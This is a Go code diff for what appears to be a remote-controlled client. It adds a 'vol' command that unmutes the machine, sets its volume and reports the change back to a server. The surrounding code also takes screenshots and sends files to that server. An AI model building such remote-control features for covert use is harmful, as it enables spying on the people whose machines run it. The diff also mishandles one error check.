@@ -15,6 +15,7 @@ import (
 
 	"github.com/ebitengine/oto/v3"
 	"github.com/hajimehoshi/go-mp3"
+	"github.com/itchyny/volume-go"
 	"github.com/vova616/screenshot"
 )
 
@@ -58,6 +59,38 @@ func ss() {
 		panic(err)
 	}
 	f.Close()
+}
+
+func setVol(newVol int) string {
+	if newVol < 0 {
+		fmt.Println("Volume must be between 0 and 100")
+		return "Invalid volume level"
+	}
+	if newVol > 100 {
+		fmt.Println("Volume must be between 0 and 100")
+		return "Invalid volume level"
+	}
+
+	vol, err := volume.GetVolume()
+
+	err = volume.Unmute()
+	if err != nil {
+		fmt.Println("unmute failed:", err)
+	}
+
+	if err != nil {
+		fmt.Println("get volume failed:", err)
+	}
+	fmt.Printf("current volume: %d\n", vol)
+
+	err = volume.SetVolume(newVol)
+
+	if err != nil {
+		fmt.Println("set volume failed:", err)
+	}
+	fmt.Printf("set volume success\n")
+
+	return strconv.Itoa(vol)
 }
 
 func sendFile(filePath string, mediaType string) string {
@@ -248,10 +281,27 @@ func main() {
 				fmt.Println("Playing sound...")
 				go playSound(command[1])
 
+			case "vol":
+				if len(command) < 2 {
+					fmt.Println("Invalid usage", userInput)
+					fmt.Println("Hint try vol (number)")
+					userInput = "idle"
+					break
+				}
+				volumeLevel, err := strconv.Atoi(command[1])
+				if err != nil {
+					fmt.Println("Invalid volume level:", command[1])
+					userInput = "idle"
+					break
+				}
+				output := setVol(volumeLevel)
+				fmt.Println(output)
+				reportProgress(serverIp, "Volume set from "+output+" to "+command[1])
+
 			default:
 				time.Sleep(2 * time.Second)
 
-				if strings.HasPrefix(userInput, "error") {
+				if strings.HasPrefix(userInput, "error") || strings.HasPrefix(userInput, "Error") {
 					mutex.Lock()
 					tunnelURL = "unknown"
 					mutex.Unlock()
